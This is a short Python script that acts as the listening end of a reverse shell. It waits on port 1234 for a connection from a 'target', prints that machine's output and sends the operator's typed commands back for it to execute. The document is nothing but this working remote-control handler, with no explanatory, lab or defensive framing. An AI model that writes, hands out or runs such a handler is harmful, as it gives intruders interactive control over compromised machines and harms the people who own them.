import socket

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 1234       # Port to listen on

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print(f"[+] Listening on port {PORT}...")
conn, addr = s.accept()
print(f"[+] Connection received from {addr[0]}:{addr[1]}")

while True:
    try:
        # Receive data from the target
        data = conn.recv(1024).decode('utf-8', 'ignore')
        if not data:
            break
        print(data, end='')

        # Get command from user and send it
        command = input()
        conn.sendall(command.encode('utf-8') + b'\n')
    except KeyboardInterrupt:
        break
    except Exception as e:
        print(f"\n[!] Error: {e}")
        break

conn.close()
s.close()
print("\n[+] Connection closed.")